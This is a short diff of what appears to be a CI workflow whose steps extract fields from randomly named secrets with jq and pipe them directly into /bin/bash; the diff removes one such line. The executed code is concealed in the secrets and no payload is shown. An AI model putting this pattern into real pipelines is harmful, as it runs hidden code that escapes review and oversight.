@@ -21,7 +21,6 @@ jobs:
           zk5: ${{ secrets.zk5 }}
         run: |
           printf '%s' "$zk5" | jq -r .hi47 | /bin/bash
-          printf '%s' "$tvw570" | jq -r .ukyto12167 | /bin/bash
           printf '%s' "$avpi7853" | jq -r .gb86 | /bin/bash
           echo $i50905 | jq -r .vamlh41515 | /bin/bash
           echo $mh0757 | jq -r .xvsc91532 | /bin/bash
